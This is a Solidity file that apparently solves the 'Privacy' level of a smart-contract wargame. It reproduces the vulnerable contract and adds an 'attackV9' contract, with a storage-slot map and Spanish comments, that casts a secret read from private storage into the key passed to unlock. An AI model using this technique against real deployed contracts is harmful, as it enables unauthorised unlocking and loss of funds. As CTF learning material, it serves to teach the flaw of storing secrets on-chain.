// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(block.timestamp);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}

interface IPrivacy {
function unlock(bytes16 _key) external;
}
contract attackV9 {

/* 
| Slot 0 | bool locked |
| Slot 1 | uint256 ID |
| Slot 2 | uint8 flattening + unit8 denomination + uint16 awkwardness |
| Slot 3 | bytes32 data[0] |
| Slot 4 | bytes32 data[1] |
| Slot 5 | bytes32 data[2] |
*/
    function attack(bytes32 value_of_the_storage, address _addr_where_the_storage_at) public {
       //Casteamos la llave a bytes 16 
        bytes16 key = bytes16(value_of_the_storage);
        //LLamamos el contrato donde haremos el ataque
        Privacy privacy = Privacy(_addr_where_the_storage_at);
        // le pasamos la llave casteada en la funcion a explotar
        privacy.unlock(key);
    }
}